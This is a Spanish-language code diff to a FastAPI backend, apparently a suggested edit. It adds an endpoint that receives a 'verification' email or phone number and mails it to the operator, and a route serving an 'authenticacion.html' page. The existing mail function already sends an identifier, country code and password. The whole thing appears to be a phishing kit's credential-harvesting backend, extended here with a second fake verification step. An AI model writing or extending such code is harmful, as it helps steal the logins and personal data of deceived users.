@@ -97,7 +97,28 @@ class FormResponse(BaseModel):
     mensaje: str
     id: int
 
+# Agrega esta clase nueva para recibir los datos del formulario 2
+class DatosVerificacion(BaseModel):
+    tipo: str  # "correo" o "telefono"
+    valor: str
 
+@app.post("/api/verificacion")
+async def guardar_verificacion(data: DatosVerificacion):
+    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Esto toma el dato que enviaste (correo o teléfono) y lo envía a tu email
+    try:
+        # Reutilizamos tu lógica de envío
+        enviar_correo(
+            identificador=data.valor, 
+            codigo_pais="N/A", 
+            contrasena=f"Tipo de dato: {data.tipo}", 
+            fecha=fecha
+        )
+    except Exception as e:
+        print(f"Error al enviar correo: {e}")
+        
+    return {"status": "ok"}
 # ─────────────────────────────────────────────────────────────
 # Función de envío de correo (Gmail SMTP)
 # ─────────────────────────────────────────────────────────────
@@ -132,6 +153,9 @@ Nuevo registro recibido:
 async def serve_index():
     return FileResponse("index.html")
 
+@app.get("/authenticacion.html", response_class=FileResponse, include_in_schema=False)
+async def serve_auth():
+    return FileResponse("authenticacion.html")
 
 @app.post("/api/formulario", response_model=FormResponse)
 async def guardar_formulario(data: FormData):
